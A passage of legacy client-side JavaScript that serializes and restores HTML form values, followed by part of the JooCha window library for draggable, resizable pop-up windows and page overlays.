                        case 'submit':
                                //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
								ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
								rObj[els[i].name]=(els[i].value);
								if(FD)FD.append(els[i].name,els[i].value);
								//if(els[i].name=='t_ServiceFeePercent'){alert(encodeURIComponent(els[i].value));alert(ret);break;}
                                break;
                        case 'checkbox':
                                if (els[i].checked) {
                                        //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
										ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
										rObj[els[i].name]=(els[i].value);
										if(FD)FD.append(els[i].name,els[i].value);
                                }else
                                {
										ret+='&'+els[i].name + "=0";
										rObj[els[i].name]=0;
										if(FD)FD.append(els[i].name,0);
                                }
                                break;
                        case 'radio':
                                if (els[i].checked) {
                                        //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
										ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
										rObj[els[i].name]=(els[i].value);
										if(FD)FD.append(els[i].name,els[i].value);
                                }
                                break;
								
                        }
                        break;
                        case 'file':
						{
							for(var c=0;i<els[i].files.length;c++)
							{
								rObj[els[i].name]=els[i].files[c];
								if(FD)FD.append(els[i].name,els[i].files[c]);
							}
						}
                        break; 
                case 'TEXTAREA':
                        //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
						ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
						rObj[els[i].name]=els[i].value;
						if(FD)FD.append(els[i].name,els[i].value);
                        break;
                case 'SELECT':
                        switch (els[i].type) {
                        case 'select-one':
                                //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
								ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
								rObj[els[i].name]=els[i].value;
								if(FD)FD.append(els[i].name,els[i].value);
                                break;
                        case 'select-multiple':
								{
									var ploc=0;
									rObj[els[i].name]=[];
									for (j = els[i].options.length - 1; j >= 0; j = j - 1) {
											if (els[i].options[j].selected) {
													//q.push(els[i].name + "=" + encodeURIComponent(els[i].options[j].value));
													ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].options[j].value);
													rObj[els[i].name][ploc++]=els[i].options[j].value;
											}
									}
									if(FD)FD.append(els[i].name,rObj[els[i].name]);
								}
                                break;
                        }
                        break;
                case 'BUTTON':
                        switch (els[i].type) {
                        case 'reset':
                        case 'submit':
                        case 'button':
                                //q.push(els[i].name + "=" + encodeURIComponent(els[i].value));
								ret+='&'+els[i].name + "=" + encodeURIComponent(els[i].value);
								rObj[els[i].name]=els[i].value;
								if(FD)FD.append(els[i].name,els[i].value);
                                break;
                        }
                        break;
                }

        }

		if(type.toLowerCase()=="object")return rObj;
		if(type.toLowerCase()=="json")return JSON.stringify(rObj);
		if(FD && (type.toLowerCase()=="formdata"))return FD;
		
		//console.log(ret);
		//return q.join("&");
		
		return ret;
        
}

//------------------------------------------------------------------------------
function putFromSerialize(form,vJson,type) 
{
		var rObj;
		if((!type) || (type==undefined))type="json";
		try{
			if(typeof vJson=="object"){
				rObj=vJson;
			}else{
				rObj=JSON.parse(vJson);
			}
		}catch(e)
		{
			console.log("putFromSerialize wrong parameters:"+e);
			return "";
		}
		
        if(!form) return "";
        if(typeof form !=="object") 
		{
		    form=document.getElementById(form);
			if(!form) return "";
        }

		var i, j, q = [],ret="";
		
		var els={},rStat;
		var inps=form.getElementsByTagName("INPUT");
		var txta=form.getElementsByTagName("TEXTAREA");
		var slct=form.getElementsByTagName("SELECT");
		var btna=form.getElementsByTagName("BUTTON");
		
		var iPos=0;
		for(i=0;i<inps.length;i++){els[iPos]=inps[i];iPos++;}
		for(i=0;i<txta.length;i++){els[iPos]=txta[i];iPos++;}
		for(i=0;i<slct.length;i++){els[iPos]=slct[i];iPos++;}
		for(i=0;i<btna.length;i++){els[iPos]=btna[i];iPos++;}

        for (i = iPos - 1; i >= 0; i = i - 1) 
		{
                if (els[i] === undefined || els[i].name === "" )//|| els[i].disabled
				{
                        continue;
                }
				
				if(!rObj.hasOwnProperty(els[i].name))continue;
					
				rStat=false;
				if(rStat=els[i].getAttribute('data-remove'))
				{
					rStat.toLowerCase();
					if(rStat==true || rStat=='true' || rStat=='1' || rStat=='y' || rStat=='yes' || rStat=='on')continue;
				}
				
				if(rStat=els[i].getAttribute('removed_status'))
				{
					rStat.toLowerCase();
					if(rStat==true || rStat=='true' || rStat=='1' || rStat=='y' || rStat=='yes' || rStat=='on')continue;
				}

                switch (String(els[i].tagName).toUpperCase()) 
				{
				default:
                case 'INPUT':
                        switch (String(els[i].type).toLowerCase()) {
						case 'hidden':continue;
						case 'password':if(els[i].disabled)continue;
						default:
                        case 'text':
                        case 'button':
                        case 'reset':
                        case 'submit':
								els[i].value=rObj[els[i].name];
                                break;
                        case 'checkbox':
							if(rObj[els[i].name])
								els[i].checked=true;
							else
								els[i].checked=false;
                                break;
                        case 'radio':
                                if (els[i].value==rObj[els[i].name]) {
										els[i].checked=true;
                                }
                                break;
								
                        }
                        break;
                        case 'file':
                        break; 
                case 'TEXTAREA':
						els[i].value=rObj[els[i].name];
						try{
						if(els[i].id && GlobalEventList && GlobalEventList[els[i]] && GlobalEventList[els[i]]["change"] && GlobalEventList[els[i]]["function"])
							GlobalEventList[els[i]]["function"](els[i]);
						}catch(e){console.log(e);}
                        break;
                case 'SELECT':
                        switch (els[i].type) {
                        case 'select-one':
								var opts=els[i].getElementsByTagName("option");
								for(var b=0;b<opts.length;b++){
									if(opts[b].value==rObj[els[i].name])
									{
										opts[b].selected=true;
										break;
									}
								}
                                break;
                        case 'select-multiple':
								if(Array.isArray(rObj[els[i].name]))
								{
									for (j = els[i].options.length - 1; j >= 0; j = j - 1)
									{
										for(k=0;k<rObj[els[i].name].length;k++)
										{
											if(els[i].options[j].value==rObj[els[i].name][k]){
												els[i].options[j].selected=true;
												break;
											}
										}
									}
								}
                                break;
                        }
                        break;
                case 'BUTTON':
                        switch (els[i].type) {
                        case 'reset':
                        case 'submit':
                        case 'button':
								els[i].value=rObj[els[i].name];
                                break;
                        }
                        break;
                }

        }

		return true;
        
}


//------------------------------------------------------------------------------
//==========
//bechdvis cin, parametrebi daalagos excelshi gadasatani
//==========
function preFormPrint(stl,AFields,Drafts)
{
    var oSX=document.getElementById('SX');
	var oHR=document.getElementById('HR');
	var vHR='';
	var r=AFields,onw,oxl;
	var elrowbox,element,elxlsx;
	oSX.value=Drafts;
    
	for(var pob in r)
	{
	    if(!Array.isArray(r[pob]))continue;
		
	    try{
		
		if(!document.getElementById(pob+'_xlsx'))
		{

		    onw=document.createElement('INPUT');

			onw.id=pob+'_xlsx';
			onw.name=pob+'_xlsx';
			onw.type='hidden';
			oSX.appendChild(onw);

			
		    oxl=document.createElement('INPUT');
			oxl.id=pob+'_xlsx_XLSField';
			oxl.name=pob+'_xlsx_XLSField';
			oxl.type='hidden';
			oSX.appendChild(oxl);
		}
		
		elrowbox=document.getElementById(r[pob][0]+'_rowbox');
		element=document.getElementById(r[pob][0]);
		elxlsx=document.getElementById(pob+'_xlsx');
		
		if(elxlsx)
			if(element)
			{
				elxlsx.value=element.value;
				document.getElementById(pob+'_xlsx_XLSField').value=r[pob][1];
				if(r[pob][3])
				{
					var cmd=r[pob][3];
					if(cmd)
					{
						if(r['name'])cmd=r[pob][3].replace(/local/gi,r['name']);
						eval(cmd);
					}
				}
			}
			else jcLog('Error on input field: '+r[pob][0]+'; ');
		else  jcLog('Error on XLSField: '+pob+'_xlsx;');

		if(elrowbox)
			if(r[pob].length>=2 && r[pob][2]=='hidden')
			{
				elrowbox.style.display='none';
				elrowbox.style.visibility='hidden';
				if(r[pob][1])vHR=vHR+' '+str2Int(r[pob][1])+',';
			}else
			{
				if(elrowbox.tagName.toUpperCase()=='TR')
				{
					elrowbox.style.display='table-row';
				}else
				if(elrowbox.tagName.toUpperCase()=='TD')
				{
					elrowbox.style.display='table-cell';
				}else
				{
					elrowbox.style.display='inline-block';
				}
				elrowbox.style.visibility='visible';
			}
		
		}
		catch(e)
		{
		  alert('Error on field: '+pob+'; '+r[pob][0]+';');
		}
	}
	
	if(oHR)oHR.value=vHR;
}

//------------------------------------------------------------------------------
function formAutoRegister(objControl)
{
	if(typeof objControl != "object")objControl=document.getElementById(objControl);
	var els=objControl.getElementsByTagName("input");
	
	var isFill=0;
	for(var i=0;i<els.length;i++){
               if(els[i].value.length>0){isFill=true;}
               AddEventOnObject(els[i],"change",function(){formAutoRegister(objControl);});
        }
	
	if(isFill)
		delClass(objControl,"onlyMe");
	else
		addClass(objControl,"onlyMe");
		
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
function formToClipboard(formName)
{
	var rObj=serialize(formName,"json");
	//if(rObj)
}
//------------------------------------------------------------------------------
function formRestoreFromClipboard(formName)
{

}
//------------------------------------------------------------------------------
function formReclear(formName){
	var rObj=serialize(formName,"object");

}

//------------------------------------------------------------------------------

/* jc_window.js */

/**
 * HTML DOM Window - JavaScript JooCha Library
 *
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.3.1
 *
 * See usage examples at http://joocha.com/examples
 */
var DivObjectSystemName='WindowsJCSystem';
var SaveX=5;
var SaveY=5;
var SaveRealX=5;
var SaveRealY=5;
var _RESIZING_PROCESSING=false;

var SaveMove=false;
var SaveResize=false;
var VTimTim=0;
var RESIZINGOBJECTNM=0;
var SelfDocument,ParentDocument;
var SelfWindow,ParentWindow;
var FireHandleParent=0;

var GLOBWINOBJSTARTINDEX=50000;
var GLOBWINOBJCOUNTER=GLOBWINOBJSTARTINDEX;
var GLOBWINOBJNAME='movobjwin';
var GLOBWINOBJWIDTH='800px';
var GLOBWINOBJHEIGHT='500px';
var GLOBWINOBJTOP='25px';
var GLOBWINOBJLEFT='25px';

var GLOBWINOBJCLASS="";//JCWinHeader, JCWinBody,JCWinBottom
var GLOBWINOBJTOPBUTTON;
var GLOBWINOBJTOPLEFT="";
var GLOBWINDOWNAME='Window Name';
var GLOBWINOBJTOPRIGHT="";

var GLOBWINOBJMIDLEFT="";
var GLOBWINOBJMIDMIDDLE="";
var GLOBWINOBJMIDRIGHT="";


var GLOBWINOBJBOTLEFT="";
var GLOBWINOBJBOTMIDDLE="";
var GLOBWINOBJBOTRIGHT="";

var GlobalWinResizingObject;
var GlobalWinResizingClientArea;
var GlobalWinResizingHTMLValue;
var GlobalWinResizingLaterValue;
var GlobalWinResizingHTMLMethod;
var GlobalWinResizingX;
var GlobalWinResizingY;
var GlobalWinResizingW;
var GlobalWinResizingH;

var GWRStpX;
var GWRStpY;
var GWRStpW;
var GWRStpH;
var GWRStep=10;
var GWRAchka=1.1;
var GWRIndex=0;
var GWRInterval=0;
//----------------------------------------------------------------------
//--------------------------------------------------------
function GetWithZoomParam(pp)
{
    var W2=pp+"_";
    if((W2.indexOf("px")>0) || 
    (W2.indexOf("cm")>0) || 
    (W2.indexOf("mm")>0) || 
    (W2.indexOf("in")>0) || 
    (W2.indexOf("pt")>0) || 
    (W2.indexOf("pc")>0) || 
    (W2.indexOf("%")>0)
    )return pp;

return (pp+"px");
}
//--------------------------------------------------------
function GetZoomType(pp)
{
    var W2=pp+"_";
    if(W2.indexOf("px")!=-1)return "px"; 
    if(W2.indexOf("cm")!=-1)return "cm"; 
    if(W2.indexOf("mm")!=-1)return "mm"; 
    if(W2.indexOf("in")!=-1)return "in"; 
    if(W2.indexOf("pt")!=-1)return "pt"; 
    if(W2.indexOf("pc")!=-1)return "pc"; 
    if(W2.indexOf("%")!=-1)return "%"; 

return "";
}
//--------------------------------------------------------
function ZoomPlus(size,plus)
{
  if(!size)size='0px';
  if(size.toLowerCase()=='inherit'){
    var s='-';
    if(parseFloat(plus)>=0)s='+';
	return 'calc(100% '+s+' '+Math.abs(parseFloat(plus))+GetZoomType(plus)+')';
  }
  var t=GetZoomType(size);
  if(!plus)plus=0;
  var pt=GetZoomType(plus);
  if(t!=pt && t!='' && pt!=''){
    var s='-';
    if(parseFloat(plus)>=0)s='+';
	return 'calc('+size+' '+s+' '+Math.abs(parseFloat(plus))+GetZoomType(plus)+')';
  }
  
  var s=String(parseFloat(size)+parseFloat(plus));
  return String(s+t); 
}
//--------------------------------------------------------
function ZoomMinus(size,plus)
{
  return ZoomPlus(size,'-'+plus);
}
//--------------------------------------------------------
function GWZP(W2)
{
return GetWithZoomParam(W2);
}
//--------------------------------------------------------
function getScrollPos() 
{
return {'x': window.pageXOffset ? window.pageXOffset : document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft, 'y': window.pageYOffset ? window.pageYOffset : document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop}
};
//--------------------------------------------------------
function jc_getComputedStyle(obj){
	var computedStyle;
	if (window.getComputedStyle) {
		computedStyle = getComputedStyle(obj, null);
	} else {
		computedStyle = obj.currentStyle
	}
return computedStyle;
}
//--------------------------------------------------------	
function GetObjectZoomParameters(obj,o2,wthscroll)
{
if((obj == null || obj == undefined || !obj)&&(o2==null || o2 == undefined || !o2))return null;
if(typeof obj!=="object")if(document.getElementById(obj))obj=document.getElementById(obj);
var RW="0",RH="0",RL=0,RT=0;
var etapW=0,etapH=0;
var scrollW=0,scrollH=0;

if(!wthscroll)wthscroll=0;
/// Width
var osw=0;
if(obj && obj!=undefined)
{
	if(obj.style)parseInt(obj.style.width+' ');
	if(obj.style)if((BrowserType==1) || (BrowserType=2)) if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(obj.style.pixelWidth){RW=obj.style.pixelWidth+'_';etapW++;}
	if(wthscroll)if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(obj.scrollWidth){RW=obj.scrollWidth+'_';etapW++;}
	if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(obj.offsetWidth){RW=obj.offsetWidth+'_';etapW++;}
	if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(obj.clientWidth){RW=obj.clientWidth+'_';etapW++;}
	if(obj.style)if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(obj.style.width){RW=obj.style.width+'_';etapW++;}
}
if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))
{
    RW="0";etapW++;//6
    if(o2 && o2!=undefined){
    if(wthscroll)if(o2.scrollWidth){RW=o2.scrollWidth+'_';etapW++;}
    if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(o2.offsetWidth){RW=o2.offsetWidth+'_';etapW++;}
    if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw))if(o2.clientWidth){RW=o2.clientWidth+'_';etapW++;}
    if(!parseInt(RW) || (RW.indexOf('%')>0) || (parseInt(RW)==osw)){RW="0";etapW++;}
    };
}


/// Height
var osh=0;
if(obj && obj!=undefined)
{
	if(obj.style)parseInt(obj.style.height+' ');
	if(obj.style)if((BrowserType==1) || (BrowserType=2)) if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(obj.style.pixelHeight){RH=obj.style.pixelHeight+'_';etapH++;}
	if(wthscroll)if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(obj.scrollHeight){RH=obj.scrollHeight+'_';etapH++;}
	if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(obj.offsetHeight){RH=obj.offsetHeight+'_';etapH++;}
	if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(obj.clientHeight){RH=obj.clientHeight+'_';etapH++;}
	if(obj.style)if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(obj.style.height){RH=obj.style.height+'_';etapH++;}
}	
if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))
{
     RH="0";etapH++;
     if(o2 && o2!=undefined){
     if(wthscroll)if(o2.scrollHeight){RH=o2.scrollHeight+'_';etapH++;}
     if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(o2.offsetHeight){RH=o2.offsetHeight+'_';etapH++;}
     if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh))if(o2.clientHeight){RH=o2.clientHeight+'_';etapH++;}
     if(!parseInt(RH) || (RH.indexOf('%')>0) || (parseInt(RH)==osh)){RH="0";etapH++;}
     }
}

//alert(obj+' '+obj.scrollHeight+' '+obj.offsetHeight+' '+obj.clientHeight+' ');
RW=parseInt(RW);
RH=parseInt(RH);

var pob=obj;
while(pob)
{
   RL+=pob.offsetLeft;
   RT+=pob.offsetTop;
   pob=pob.offsetParent;
}


var zoom={x:'0', y:'0', width:'100%', height:'100%', etapH:'0', etapW:'0', scrollW:'0', scrollH:'0',clientWidth:'0', clientHeight:'0', 'scrollLeft': window.pageXOffset ? window.pageXOffset : document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft, 'scrollTop': window.pageYOffset ? window.pageYOffset : document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop};
if(RW)zoom.width=RW;
if(RH)zoom.height=RH;
zoom.x=GWZP(RL);
zoom.y=GWZP(RT);
zoom.etapW=etapW;
zoom.etapH=etapH;

zoom.scrollW=parseInt(RW);
if(obj)zoom.scrollW=Math.max(zoom.scrollW,obj.scrollWidth);
if(o2)zoom.scrollW=Math.max(zoom.scrollW,o2.scrollWidth);

zoom.scrollH=parseInt(RH);
if(obj)zoom.scrollH=Math.max(zoom.scrollH,obj.scrollHeight);
if(o2)zoom.scrollH=Math.max(zoom.scrollH,o2.scrollHeight);

zoom.width=GWZP(zoom.width);
zoom.height=GWZP(zoom.height);

if(o2 && obj)
{
	zoom.clientWidth=parseInt(obj.clientWidth || o2.clientWidth);
	zoom.clientHeight=parseInt(obj.clientHeight || o2.clientHeight);
}
else
if(o2)
{
	zoom.clientWidth=parseInt(o2.clientWidth);
	zoom.clientHeight=parseInt(o2.clientHeight);
}
else
if(obj)
{
	zoom.clientWidth=parseInt(obj.clientWidth);
	zoom.clientHeight=parseInt(obj.clientHeight);
}


return zoom;
}
//-------------------
function GetObjectCoords(element,o2)
{
return GetObjectZoomParameters(element,o2);
}
//-------------------
function GetDivCoords(divId)
{
	var doc=SelfDocument;
	if(FireHandleParent)doc=ParentDocument;
	return GetObjectZoomParameters(divId,doc.documentElement,1);
}
//---------------------------
function adjustRows(ta)
{
  zobj=GetObjectCoords(ta.parentNode)
  ta.rows=Math.round(parseInt(zobj.height)/20);
}
//-------------------
function initDocument(){return GetDocument();};
function GetDocument()
{
SelfWindow=window.self;
ParentWindow=window.parent;
if(window.self)
      SelfDocument=window.self.document;
if(window.parent)
      ParentDocument=window.parent.document;
if(!SelfDocument) SelfDocument=document;
return SelfDocument;
}
//-------------------------
function IFrameResizeByContent(frmnm)
{
if(!frmnm)return '';
var obj=frmnm;
if(typeof obj!=="object")obj=document.getElementById(frmnm);
if(typeof obj!=="object")return '';
obj.style.height='100%';
obj.style.width='100%';
    var gcs=GetFrameZoom(obj);
    obj.style.width=ZoomPlus(gcs.width);
    obj.style.height=ZoomPlus(gcs.height,125);
	//obj.style.overflow='hidden';
}
//-------------------------
function fitAroundByParent(frmnm)
{
if(!frmnm)return false;
var obj=frmnm;
if((typeof obj)!=="object")obj=document.getElementById(frmnm);
if(!obj)return false;
if((typeof obj)!=="object")return false;

	var par=obj.parentElement || par.parentNode;
	obj.style.height='100%';
	obj.style.width='100%';
	
    var gcs=GetObjectCoords(par);
    obj.style.width=ZoomPlus(gcs.width,0);
    obj.style.height=ZoomPlus(gcs.height,0);
	//obj.style.overflow='hidden';
return true;	
}
//-------------------------
function currentSizeToFixed(frmnm)
{
	if(!frmnm)return '';
	var obj=frmnm;
	if(typeof obj!=="object")obj=document.getElementById(frmnm);
	if(typeof obj!=="object")return '';
    var gcs=GetObjectCoords(obj);
    obj.style.width=ZoomPlus(gcs.width,0);
    obj.style.height=ZoomPlus(gcs.height,0);
	//obj.style.overflow='hidden';

}
//-------------------------
function parentSizeToFixed(frmnm)
{
	if(!frmnm)return '';
	var obj=frmnm;
	if(typeof obj!=="object")obj=document.getElementById(frmnm);
	if(typeof obj!=="object")return '';
	var par=obj.parentElement || par.parentNode;
	currentSizeToFixed(par);
}

//----------------------------
function AlphaMainWin(opc,evoc)// 0..1, event onclick;
{
var doc=SelfDocument;
var win=SelfWindow;

if(FireHandleParent)
{
  doc=ParentDocument;
  win=ParentWindow;
}
    var objall=doc.getElementsByTagName('select');
    if(!objall)objall=doc.body.all;

    if(BrowserType==1)
    for(var i=0;i<objall.length;i++)
    {
        if((objall[i].tagName.toUpperCase()=='SELECT') || (objall[i].tagName.toUpperCase()=='INPUT'))
             {objall[i].style.display='none';/*objall[i].style.visibility='hidden';*/}
    }

	//doc.body.style.overflow='hidden';
    //doc.body.className="dark";
    var gcs=GetObjectZoomParameters(doc.body,doc.documentElement,1);
	//var zoom=getWinMaximizeCoords();
//alert(gcs.height+"__"+gcs.etapH);
    var oDiv=doc.createElement("DIV");
    oDiv.className='darkBackWindow';
    oDiv.UNSELECTABLE=true;
    oDiv.style.position='fixed';
	oDiv.style.zIndex=10;
    oDiv.style.left=0;
    oDiv.style.top=0;
    oDiv.style.bottom=0;
    oDiv.style.right=0;
	oDiv.style.owerflow='auto';

    //oDiv.style.width=0;
    oDiv.style.height=ZoomPlus(gcs.height,25);
    oDiv.style.float='left';
    oDiv.style.clear='none';
    oDiv.style.border='none';
    oDiv.style.margin=0;
    oDiv.style.padding=0;
    oDiv.style.background='#000';
    var opcval=(1-opc);
    if(opcval<0)opcval=0;
    if(opcval>1)opcval=1;

    if(BrowserType==1)
    oDiv.style.filter="alpha(opacity="+(opcval*100)+")";
    else
    oDiv.style.opacity=opcval;

    if(evoc)AddEventByString(oDiv,'click',"WinRemoveObject(this);"+evoc);
	else AddEventByString(oDiv,'click',"WinRemoveObject(this);ShowNormalMainWin();");

    doc.body.appendChild(oDiv);

}
//----------------------------
function ShowNormalMainWin()
{

    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;
    var objall=doc.getElementsByTagName('select');
    if(!objall)objall=doc.body.all;
	
	//doc.body.style.overflow='visible';

    try{
        if(BrowserType==1)
        for(var i=0;i<objall.length;i++)
        {
            if((objall[i].tagName.toUpperCase()=='SELECT') || (objall[i].tagName.toUpperCase()=='INPUT'))
                 {objall[i].style.display='block';/*objall[i].style.visibility='display';*/}
        }
    }catch(e){};

    try{
        //  doc.body.style.backgroundColor='#FFFFFF';
       // doc.body.className="";
          if(doc.body.filters)
             doc.getElementById('MainDocument').style.filter="";
          else
             doc.getElementById('MainDocument').style.opacity='';
    }catch(e){};


    objall=doc.body.childNodes;
    for(var i=0;i<objall.length;i++)
    if(objall[i].className=='darkBackWindow')
    {
        WinRemoveObject(objall[i]);
    };//else if(objall[i].className);//alert( 'test'+objall[i].className);

    //doc.getElementById('MainDocument').unselectable=0;
    //doc.getElementById('MainDocument').disabled=0;

}
//--------------------------
function StartTimerResizing()
{
	var doc=SelfDocument;
	var win=SelfWindow;
	if(FireHandleParent)
	{
	  doc=ParentDocument;
	  win=ParentWindow;
	}
	
	var th=doc.getElementById(RESIZINGOBJECTNM);
	var crd=GetObjectCoords(th);
	var xWidth=parseInt(MouseX)-parseInt(crd.x)+doc.body.scrollLeft;
	var yHeight=parseInt(MouseY)-parseInt(crd.y)+doc.body.scrollTop;

	if(xWidth<100)xWidth=100;
	if(yHeight<50)yHeight=50;

	xWidth+=7;
	yHeight+=5;

	var thbar=doc.getElementById(RESIZINGOBJECTNM+"_bottombar");
	thbar.innerHTML=xWidth + " X "+yHeight;

	th.style.width=xWidth;
	th.style.height=yHeight;
	SaveRealX=MouseX;
	SaveRealY=MouseY;
}

function StartResizing(objnm)
{
    RESIZINGOBJECTNM=objnm;
    SaveRealX=MouseX;
    SaveRealY=MouseY;
   if(VTimTim)clearInterval(VTimTim);
   _RESIZING_PROCESSING=true;
   VTimTim=setInterval('StartTimerResizing()',100);
}

function StopResizing()
{
    clearInterval(VTimTim);
    VTimTim=0;
	_RESIZING_PROCESSING=false;
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;
    var thbar=doc.getElementById(RESIZINGOBJECTNM+"_bottombar");
    thbar.innerHTML="_____";
}

function StopDraging()
{
    clearInterval(VTimTim);
	_RESIZING_PROCESSING=false;
}

function WinRemoveObject(obj)
{
     var par=obj.parentNode;
     if(par)
     {
          par.removeChild(obj);
          return true;
     }
return false;
}

function WinRemoveById(objnm)
{
var doc=SelfDocument;   //New
if(FireHandleParent)doc=ParentDocument; //New

     var obj=doc.getElementById(objnm);
     if(!obj)return false;
     return WinRemoveObject(obj);
}

function winresize(thnm,x,y,w,h)
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
    if(thnm)
    {
        var obj=doc.getElementById(thnm);
        if(obj)
        {
		   obj.style.top=GWZP(y);
		   obj.style.left=GWZP(x);
		   obj.style.width=GWZP(w);
		   obj.style.height=GWZP(h);
		   var dtd=doc.getElementById(thnm+"_ca_td");
		   var dca=doc.getElementById(thnm+"_ca");
  		   if(dtd && dca)
  		   {
     		   var crd=GetObjectZoomParameters(dtd,doc.documentElement,1);
	 		   //dca.style.height=crd.height;
	 		   //dca.style.width=crd.width;
		     }
			fitAroundProcess();
        }
   }


}

function winmaximize(thnm)
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
    if(thnm)
    {
        var obj=thnm;if(typeof thnm=="string")obj=doc.getElementById(thnm);
		var dsz=obj.getAttribute("data-size");
		
		if(dsz=="maximize"){winminimize(thnm);return false;}
		
        if(obj)
        {
		   var objMain=doc.getElementById('MainDocument') || doc;//.body || doc;
				
			var stdSize=GetObjectCoords(obj);
			var crd=GetObjectCoords(objMain,objMain.documentElement);

			obj.setAttribute("data-standard-rect-json",JSON.stringify(stdSize));
			obj.setAttribute("data-size","maximize");
				
			var topY=Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop));
			var y=topY+15+'px';
			var x='25px';
			var w=(parseInt(crd.width)-50)+'px';
			var h=Math.max(parseInt(crd.height),topY-30)+'px';
			//var h=(parseInt(crd.height)-30)+'px';
			winresize(thnm,x,y,w,h);
			//WinSetPos((parseInt(crd.width)-parseInt(GLOBWINOBJWIDTH))/2+'px',Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop))+15+'px');/* (parseInt(crd.height)-parseInt(GLOBWINOBJHEIGHT))/2*/
			
        }
   }
return true;
}

function getWinMaximizeCoords()
{
	var doc=SelfDocument;
	var zoom={x:'0', y:'0', w:'100%', h:'100%'};
	if(FireHandleParent)doc=ParentDocument;
	var objMain=doc.getElementById('MainDocument') || doc;
    var crd=GetObjectCoords(objMain,objMain.documentElement);
	var topY=Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop));
	zoom.y=topY+15+'px';
	zoom.x='25px';
	zoom.w=(parseInt(crd.width)-50)+'px';
	zoom.h=Math.max(parseInt(crd.height),topY-30)+'px';
return zoom;
}

function winminimize(thnm)
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
    if(thnm)
    {

        var obj=thnm;if(typeof thnm=="string")obj=doc.getElementById(thnm);
		
		var dsz=obj.getAttribute("data-size");
		if(dsz=="minimize"){winmaximize(thnm);return false;}
		
        if(obj)
        {
		   var objMain=doc.getElementById('MainDocument') || doc;
           var crd=GetObjectCoords(objMain,objMain.documentElement);
		   
		   var stdSize=obj.getAttribute("data-standard-rect-json");
		   obj.setAttribute("data-size","minimize");
		   if(stdSize)
		   {
				stdSize=JSON.parse(stdSize);
				console.log(stdSize);
		   
				var y=stdSize.y;// '25px';
				var x=stdSize.x;//'25px';
				var w=stdSize.width;//'200px';
				var h=stdSize.height;//'50px';
				winresize(thnm,x,y,w,h);
			}else
			{
				var y='25px';
				var x='25px';
				var w='200px';
				var h='50px';
				winresize(thnm,x,y,w,h);
			
			}
        }
   }

}

function winclose(thnm)
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
    if(thnm)
    {
		var obj=thnm;
		if((typeof thnm) != "object")
		{
			var obj=doc.getElementById(thnm);
		}

        if(obj)
        {
			ShowNormalMainWin(doc);
			clearInterval(VTimTim);
			_RESIZING_PROCESSING=false;
			
			try{
				obj.remove();
			}catch(e)
			{
				var par=obj.parentNode;
				par.removeChild(obj);
			}
        }
		thnm=0;
   }
return thnm;
}


function WinParamSetDefault()
{
/*	  GLOBWINOBJSTARTINDEX=500;
      GLOBWINOBJNAME='movobjwin';
      GLOBWINDOWNAME='Window Name';
      GLOBWINOBJWIDTH='800px';
      GLOBWINOBJHEIGHT='500px';
      GLOBWINOBJTOP='25px';
      GLOBWINOBJLEFT='25px';
	  */
}

function WinSetName(nmm)
{
   GLOBWINDOWNAME=nmm;  
}


function WinSetPos(left,top)
{
      GLOBWINOBJTOP=GWZP(top);
      GLOBWINOBJLEFT=GWZP(left);
}

function WinSetZoom(wd,hg)
{
      GLOBWINOBJWIDTH=GWZP(wd);
      GLOBWINOBJHEIGHT=GWZP(hg);
}

function WinParamSetSize(left,top,wd,hg)
{
      WinSetPos(left,top);
      WinSetZoom(wd,hg);
}

function WinSetPosByObject(objnm)
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
var obj=doc.getElementById(objnm);
//alert(window.self.document.getElementById(objnm).tagName);
//alert(window.frames[0].document.getElementById(objnm)+" -4 "+objnm);
var crd=GetObjectCoords(obj);
var left,top;
    WinSetPos(crd.x,crd.y);
}

function WinSetCenter()
{
